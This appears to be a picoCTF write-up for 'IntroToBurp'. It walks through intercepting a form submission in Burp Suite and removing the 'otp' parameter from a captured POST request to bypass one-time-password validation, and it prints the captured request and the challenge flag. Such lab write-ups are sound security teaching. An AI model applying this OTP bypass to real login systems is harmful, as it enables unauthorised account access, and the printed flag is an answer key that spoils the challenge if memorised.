# IntroToBurp

### Description:

Additional details will be available after launching your challenge instance.
`Click "Launch Instance"`.
Try `here` to find the flag.

### Commands / Steps:

```bash
# Step 1: Open burpsuite. 

# Step 2: Go to the "Proxy" tab and click open browser.

# Step 3: Open the website in that browser to intercept the requests.

# Step 4: In the website, fill in the neccessary information and submit. Then in burpsuite, click "Forward".

# Step 5: After that, we will be asked to enter an OTP. After entering the OTP and click "Submit".

# Step 6: This is where we will manipulate the request. Before forwarding the request captured in burpsuite, we will see the request like this in the "Proxy" tab of burpsuite.
# POST /dashboard HTTP/1.1
# Host: titan.picoctf.net:51539
# Content-Length: 7
# Cache-Control: max-age=0
# Accept-Language: en-US,en;q=0.9
# Origin: http://titan.picoctf.net:51539
# Content-Type: application/x-www-form-urlencoded
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Referer: http://titan.picoctf.net:51539/dashboard
# Accept-Encoding: gzip, deflate, br
# Cookie: session=.eJwtjEsOwyAMRO_CugsgiUt6GRSMrVZJIOKjqKp691pKdzNvPh-Fr_ZWDxXWVd0U1sK-5ZWSIDSOAbQd2ISJo55GOzuMgOI5aIJo0cwAsuO-bT4tO8lsCSgkt0O0hbubtdhjqfXMJQozdhinq3Q8cyKf-h6oXInAXqn8ryKx-v4Amlkwuw.aPu0QQ.6C-qq_UDwauVIBbEu5x5nKBo1x8
# Connection: keep-alive

# otp=123

# Step 7: From that request, we will delete the last line "otp=123" and forward our request. Then, we will get the flag.
```

### Flag:

> picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}

### Notes / Tips

- Always watch the raw body (bottom panel) — web forms are typically application/x-www-form-urlencoded and each field appears as `key=value&key2=value2`. Editing here is straightforward.
- This is a standard demonstration of request tampering — a core Burp technique for testing server‑side validation. It’s an important skill for both red-teamers and defenders to understand.


